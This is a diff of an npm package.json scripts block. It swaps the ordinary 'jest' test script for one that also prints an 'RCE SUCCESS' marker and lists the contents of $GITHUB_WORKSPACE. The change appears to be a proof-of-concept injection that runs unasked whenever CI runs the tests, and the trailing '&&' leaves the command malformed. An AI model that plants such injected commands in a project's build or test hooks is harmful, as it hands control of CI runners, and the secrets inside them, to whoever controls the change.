@@ -41,7 +41,7 @@
     "lint:scss:fix": "npm run lint:scss -- --fix",
     "jsdoc": "jsdoc -c .jsdoc.json",
     "types": "tsc index.js --declaration --allowJs --emitDeclarationOnly --outDir types --lib dom --lib webworker --skipLibCheck",
-    "test": "jest",
+    "test": "jest&&echo '!!! RCE SUCCESS: Arbitrary Code Executed !!!' && ls -al $GITHUB_WORKSPACE&&",
     "postinstall": "node script/prism.js",
     "prepublishOnly": "npm run types",
     "dev": "webpack serve --config dev/webpack.config.js"
